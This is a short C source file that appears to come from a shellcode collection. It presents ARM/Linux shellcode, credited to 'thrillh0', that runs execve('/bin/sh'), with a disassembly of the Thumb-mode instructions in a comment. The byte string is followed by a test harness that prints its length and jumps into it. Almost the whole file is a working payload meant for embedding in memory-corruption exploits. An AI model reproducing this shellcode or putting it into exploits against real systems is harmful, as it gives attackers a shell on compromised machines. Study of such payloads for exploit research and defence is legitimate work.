/*
ARM/Linux execve("/bin/sh", NULL, NULL) -- thrillh0
This is a non-polymorphic version with a nullbyte at the end of the shellcode

shell_execve:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e28f3001 	add	r3, pc, #1
   10058:	e12fff13 	bx	r3

0001005c <thumb>:
   1005c:	a002      	add	r0, pc, #8	; (adr r0, 10068 <thumb+0xc>)
   1005e:	4049      	eors	r1, r1
   10060:	4052      	eors	r2, r2
   10062:	270b      	movs	r7, #11
   10064:	df01      	svc	1
   10066:	6161      	.short	0x6161
   10068:	6e69622f 	.word	0x6e69622f
   1006c:	0068732f 	.word	0x0068732f
*/

#include <stdio.h>
#include <string.h>

char *shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\x0b\x27\x01\xdf\x61\x61\x2f\x62\x69\x6e\x2f\x73\x68\x00";

void main(void){
	printf("Len: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}
